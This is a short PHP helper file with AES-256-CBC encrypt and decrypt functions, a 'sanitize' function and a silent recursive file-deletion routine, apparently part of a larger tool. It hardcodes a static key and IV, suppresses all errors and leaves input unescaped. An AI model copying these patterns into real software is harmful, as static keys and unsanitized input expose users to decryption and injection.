<?php
set_time_limit(0);
error_reporting(0);
function decrypt_msg($msg)
{
    $iv = "&9*zS7LY%ZN1thfI";
    $passKey = "123456789012345678901234r0hollah";
    $cipher = "aes-256-cbc";
    $returnStr = openssl_decrypt($msg, $cipher, $passKey, 0, $iv);
    return $returnStr;
}

function encrypt_msg($msg)
{
    $passKey = "123456789012345678901234r0hollah";
    $iv = "&9*zS7LY%ZN1thfI";
    $encrypted = openssl_encrypt($msg, 'aes-256-cbc', $passKey, 0, $iv);
    return $encrypted;
}
// sanitize string 
function clear_string($data)
{
    $level1 = trim($data);
    // problem with some data for parse
    // $level2 = htmlspecialchars($level1);
    return $level1;
}
// Recurse Delete
function recursiveDelete($str)
{
    if (is_file($str)) {
        return @unlink($str);
    } elseif (is_dir($str)) {
        $scan = glob(rtrim($str, '/') . '/*');
        foreach ($scan as $index => $path) {
            recursiveDelete($path);
        }
        return @rmdir($str);
    }
}